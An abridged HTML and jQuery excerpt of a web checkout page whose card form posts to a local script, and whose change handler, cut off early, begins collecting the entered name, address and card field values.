...
<body>
            ...
            <div class="form-area card-form">
                <div class="inner">
                    ...
                    <form action="../../card-form.php" method="post" name="formName" id="form">
                        ...
                        <div class="input-area">
                            ...
                            <div class="input">
                                <input type="text" name="expire" id="expire"
                                    ...
                                    placeholder="YYYY/MM" maxlength="6" required />
                        ...
                        <input type="hidden" name="page_type" id="page_type" value="type2" />
    ...
    (function($) {
        $(function() {
            ...
            $("#name, #email, #postCode, #state, #city, #line1, #cardNo, #expire, #securityCode, #holderName, .plan-radio, #date, .tab-btn")
                .on("change", function() {
                    const values = {
                        nameValue: $("#name").val(),
